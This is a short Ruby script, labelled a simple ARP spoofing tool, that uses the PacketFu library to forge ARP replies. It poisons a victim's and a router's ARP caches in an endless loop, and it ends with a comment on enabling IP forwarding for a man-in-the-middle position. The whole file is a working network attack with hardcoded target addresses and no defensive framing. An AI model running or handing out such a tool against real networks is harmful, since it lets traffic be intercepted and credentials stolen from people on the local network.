#!/usr/bin/env ruby
#
#simple ARP spoofing script

require 'packetfu'

attacker_mac = "02:3b:2f:1e:6f:a4"
victim_ip    = "192.168.0.21"
victim_mac   = "00.0C:29:38:1D:61"
router_ip    = "192.168.0.1"
router_mac   = "00:50:7F:E6:96:20"

info = PacketFu::Utils.whoami?(:iface => ARGV[0])
#
#victim
#
#build ethernet header
arp_packet_victim = PacketFu::ARPPacket.new
arp_packet_victim.eth_saddr = attacker_mac
arp_packet_victim.eth_daddr = victim_mac
#build ARP Packet
arp_packet_victim.arp_saddr_mac = attacker_mac
arp_packet_victim.arp_daddr_mac = victim_mac
arp_packet_victim.arp_saddr_ip = router_ip
arp_packet_victim.arp_daddr_ip = victim_ip
arp_packet_victim.arp_opcode = 2                  #arp code 2 == ARP reply
#
#router
#
#build ethernet header
arp_packet_router = PacketFu::ARPPacket.new
arp_packet_router.eth_saddr = attacker_mac
arp_packet_router.eth_daddr = router_mac
#build ARP Packet
arp_packet_router.arp_saddr_mac = attacker_mac
arp_packet_router.arp_daddr_mac = router_mac
arp_packet_router.arp_saddr_ip = victim_ip
arp_packet_router.arp_daddr_ip = router_ip
arp_packet_router.arp_opcode = 2

while true
  sleep 1
  puts "[+] Sending ARP packet to victim: #{arp_packet_victim.arp_daddr_ip}"
  arp_packet_victim.to_w(info[:iface])
  puts "[+] Sending ARP packet to router: #{arp_packet_router.arp_daddr_ip}"
  arp_packet_router.to_w(info[:iface])
end

#Don't forget to enable packet forwarding on your system
# echo "1" > /proc/sys/net/ipv4/ip_forward
